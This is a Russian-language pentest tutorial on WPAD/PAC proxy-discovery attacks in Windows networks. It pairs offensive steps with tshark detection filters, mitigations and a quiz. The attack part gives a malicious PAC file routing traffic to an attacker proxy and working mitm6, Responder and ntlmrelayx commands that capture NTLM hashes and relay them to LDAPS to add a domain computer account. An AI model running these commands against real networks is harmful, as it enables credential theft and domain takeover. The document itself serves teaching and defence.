---
id: network-wpad-proxy
title: "WPAD и прокси-атаки: захват трафика через автообнаружение прокси"
category: network
parent: network-dhcp
difficulty: medium
order: 1
tags: [network, wpad, proxy, pac, mitm, dhcp, ipv6]
prerequisites: [network-mitm, network-dhcp]
useful_for:
  - "Пентест внутренних сетей"
  - "Red team / AD-атаки"
  - "Защита корпоративной ЛВС"
estimated_minutes: 35
summary: "WPAD и PAC как вектор MITM: DHCP-опция 252, DNS/LLMNR-перехват, mitm6 и Responder, прозрачные прокси, риски и защита."
---

## Вопрос, с которого всё начинается

Ты подключаешь ноутбук к корпоративной сети, ничего не настраиваешь — а браузер уже знает, какой прокси использовать для интернета. Кто ему это сказал? Ответ: механизм **WPAD** (Web Proxy Auto-Discovery — автообнаружение прокси). Он ищет в сети файл с настройками и применяет их автоматически.

Звучит удобно. Проблема в том, что и поиск, и сам файл по умолчанию **не проверяются на подлинность**. Значит, любой, кто окажется в сети, может назваться прокси-сервером и пропустить через себя весь трафик жертвы. Разберём, как это работает и как этим пользуются на пентесте.

Этот урок опирается на [`network-dhcp`](network-dhcp) (кто выдаёт адреса и опции) и [`network-mitm`](network-mitm) (перехват в локальной сети).

## Наш пример: как Windows ищет WPAD

Возьмём одну жертву — Windows-ноутбук `10.0.0.5` в домене `corp.local`. При включении он хочет найти прокси и идёт по цепочке источников, пока не найдёт первый ответивший:

1. **DHCP** — запрашивает у сервера опцию **252** (в ней лежит URL файла с настройками прокси).
2. **DNS** — если DHCP молчит, пытается разрешить имя `wpad.corp.local`, затем просто `wpad`.
3. **LLMNR / NBT-NS** — если и DNS не помог, рассылает широковещательный запрос имени `wpad` (про них — в [`network-netbios-llmnr`](network-netbios-llmnr)).

Получив URL, клиент скачивает файл **PAC** (Proxy Auto-Config — файл автонастройки прокси, обычно с именем `wpad.dat`) и выполняет его. Посмотрим на дамп с ноутбука:

```
$ tshark -r boot.pcap -Y "dhcp.option.dhcp == 1 || dns.qry.name contains wpad"
    1  0.010  0.0.0.0     → 255.255.255.255  DHCP 342 DHCP Discover
   12  0.480  10.0.0.5    → 224.0.0.252      LLMNR 78 Standard query 0x1a2b A wpad
   14  0.482  10.0.0.66   → 10.0.0.5         LLMNR 94 Standard query response 0x1a2b A wpad A 10.0.0.66
```

Здесь видно главное: DHCP-сервер опцию 252 **не отдал** (иначе клиент бы сразу пошёл за PAC). Тогда ноутбук обратился по LLMNR — а ответил ему `10.0.0.66`, которого в легитимной сети быть не должно. Именно так выглядит атака со стороны жертвы.

## Шаг 1: что такое PAC и почему он опасен

PAC — это обычный текстовый файл с **одной JavaScript-функцией** `FindProxyForURL(url, host)`. Клиент вызывает её для каждого адреса и получает строку вида «куда идти». Пример, который отдаёт атакующий:

```javascript
function FindProxyForURL(url, host) {
  if (shExpMatch(host, "*.corp.local")) return "DIRECT";
  return "PROXY 10.0.0.66:8080";   // весь внешний трафик — через атакующего
}
```

То есть PAC — это **исполняемый код**, а не просто «настройка». Он может направлять трафик куда угодно. Клиент его выполнит без вопросов: подписи у PAC нет.

## Шаг 2: как атакующий подставляет свой WPAD

Есть три основных пути:

- **DHCP-опция 252.** Поднять в сети свой DHCP-сервер (или подделать ответ легитимного) и отдать в опции 252 URL со своим `wpad.dat`.
- **DNS/LLMNR-перехват.** Ответить на широковещательный запрос имени `wpad` своим адресом, а затем раздать `wpad.dat` по HTTP. Это умеет **Responder**.
- **IPv6 (mitm6).** Windows по умолчанию предпочитает IPv6 и доверяет анонсам маршрутизатора. Инструмент **mitm6** становится DHCPv6/RA-источником, назначает себя DNS для клиента и перехватывает запрос `wpad` — заодно собирая NTLM-аутентификацию.

Прогоним связку. Сначала запускаем `mitm6` — он объясняет сети, что теперь он «роутер» и DNS:

```
$ sudo mitm6 -d corp.local -i eth0
[*] Started DHCPv6 server
[*] Sent spoofed RA to fe80::aabb:ccff:fe00:1122
[*] Got DHCPv6 request from 00:11:22:33:44:55 (DESKTOP-01)
[*] Answering WPAD query for wpad.corp.local → fe80::1 (attacker)
```

`mitm6` отвечает на запрос `wpad.corp.local` своим адресом. Дальше клиент идёт к нам по HTTP за `wpad.dat` — и здесь в дело вступает **Responder** в режиме WPAD, который требует аутентификацию:

```
$ sudo responder -I eth0 -wv
[WPAD] Client 10.0.0.5 requested wpad.dat
[WPAD] Sending 401 Unauthorized
[NTLM] Captured NTLMv2 hash for user CORP\jdoe
CORP\jdoe::CORP:1122334455667788:AABBCCDDEEFF0011:...
```

Клиент, сам того не желая, прислал NTLM-хэш (свернутое доказательство владения паролём). Теперь этот хэш можно **зарелеить** (переслать) на другой сервис, где он сработает, — обычно через `ntlmrelayx`:

```
$ sudo impacket-ntlmrelayx -6 -wh attacker.corp.local -t ldaps://dc.corp.local --add-computer
[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Received connection from fe80::aabb:...
[*] Authenticating against ldaps://dc.corp.local as CORP\jdoe SUCCEED
[*] Adding new computer ATTACKER$ to domain corp.local
```

Так из одного WPAD-ответа получают рабочую NTLM-аутентификацию и, через релей на LDAP(S), — новый компьютерный аккаунт в домене. Это первый шаг цепочки RBCD (resource-based constrained delegation).

## Шаг 3: как увидеть это в дампе (защита и форензика)

Если тебе на разбор дали pcap, ищи три вещи: опцию 252, запросы имени `wpad` и скачивание `wpad.dat`:

```
$ tshark -r cap.pcap -Y 'dhcp.option.wpad_url' -T fields -e ip.src -e dhcp.option.wpad_url
10.0.0.1    http://10.0.0.1/wpad.dat
$ tshark -r cap.pcap -Y 'dns.qry.name contains wpad || nbns.name contains wpad' \
  -T fields -e ip.src -e dns.qry.name -e nbns.name | sort -u
10.0.0.5    wpad.corp.local
$ tshark -r cap.pcap -Y 'http.request.uri contains wpad.dat' -T fields -e http.host
wpad.corp.local
```

Если запросы `wpad` уходят, а ответа нет — сеть уязвима к подмене. Если есть ответ с посторонним адресом и следом скачивание `wpad.dat` — атака уже идёт.

## Шаг 4: что делать против

- **Отключить автообнаружение прокси** на всех хостах: в домене это делается групповой политикой (GPO `DisableWpad`). Тогда клиент вообще не станет искать `wpad`.
- **Не отдавать DHCP-опцию 252** и не использовать имя `wpad`.
- **Отключить IPv6**, если он не нужен, — это убирает вектор mitm6.
- **Включить SMB/LDAP signing и EPA** (Extended Protection for Authentication) — тогда перехваченный NTLM-хэш нельзя зарелеить.
- **Ограничить NTLM** в домене, где можно перейти на Kerberos.

Проверить настройку на конкретной машине Windows можно так:

```
C:\> netsh winhttp show proxy
Current WinHTTP proxy settings:
    Direct access (no proxy server).
```

Если тут «Direct access», а в настройках браузера стоит галка «Automatically detect settings» — вектор WPAD всё ещё открыт.

## Что мы теперь знаем

- WPAD ищет прокси по DHCP-опции 252, затем по DNS, затем по LLMNR/NBT-NS.
- PAC — это JavaScript-функция `FindProxyForURL`, которую клиент выполняет без проверки подлинности.
- Ответив на запрос `wpad`, атакующий становится прокси и/или собирает NTLM-аутентификацию.
- mitm6 использует приоритет IPv6 у Windows, чтобы стать DNS и WPAD.
- Защита — отключить WPAD и IPv6, включить signing/EPA и ограничить NTLM.

## Квиз

Проверь себя.

```quiz
- question: 'Какая DHCP-опция отдаёт URL WPAD-файла?'
  options:
    - '3'
    - '6'
    - '252'
    - '43'
  answer: 2
  explanation: 'Опция 252 (WPAD) сообщает клиенту URL конфигурации автообнаружения прокси.'
- question: 'Что такое PAC-файл?'
  options:
    - 'Протокол шифрования'
    - 'JavaScript-функция FindProxyForURL, задающая прокси'
    - 'Тип DHCP-запроса'
    - 'Формат сертификата'
  answer: 1
  explanation: 'PAC содержит JS-функцию FindProxyForURL, определяющую, какой прокси использовать.'
- question: 'Почему mitm6 эффективен против Windows-хостов?'
  options:
    - 'Он ломает пароли перебором'
    - 'Windows предпочитает IPv6 и по умолчанию доверяет DHCPv6/RA'
    - 'Он отключает фаервол'
    - 'Он перехватывает Wi-Fi'
  answer: 1
  explanation: 'Windows по умолчанию предпочитает IPv6 и доверяет анонсам DHCPv6/RA, что позволяет стать DNS/WPAD.'
- question: 'Какая мера полностью убирает вектор WPAD?'
  options:
    - 'Смена пароля пользователя'
    - 'GPO DisableWpad / отключение автообнаружения прокси'
    - 'Установка антивируса'
    - 'Включение NTLMv1'
  answer: 1
  explanation: 'Отключение автообнаружения прокси (DisableWpad) убирает возможность WPAD-перехвата.'
- question: 'Почему перехваченный NTLM-хэш можно использовать только при выключенном signing?'
  options:
    - 'Хэш — это пароль в открытом виде'
    - 'Без signing сервер не проверяет целостность сессии, и хэш можно зарелеить'
    - 'Хэш действителен только в IPv6'
    - 'Signing нужен только для DNS'
  answer: 1
  explanation: 'Подписывание SMB/LDAP не даёт переслать чужую аутентификацию на другой сервис.'
```

## Куда дальше

WPAD — часть одной большой связки «IPv6 + LLMNR/NBT-NS + WPAD», которая даёт почти полный перехват в сети Windows. Мы разобрали её вершину; дальше пойдём к атакам на канальный уровень — STP, переполнение таблицы MAC и обход port security. А пока запомни главное: **если клиент сам ищет, кому доверять, — найдётся тот, кто предложит себя.**

## Где пригодится

- **Пентест/red team:** получение NTLM-аутентификации и перехват трафика в ЛВС.
- **Работа/SOC:** проверка конфигурации WPAD, IPv6 и прозрачных прокси.
- **CTF:** задачи на разбор PAC-файлов и DHCP-опций.
- **Сертификации:** OSCP/CRTP — внутренние сетевые атаки.
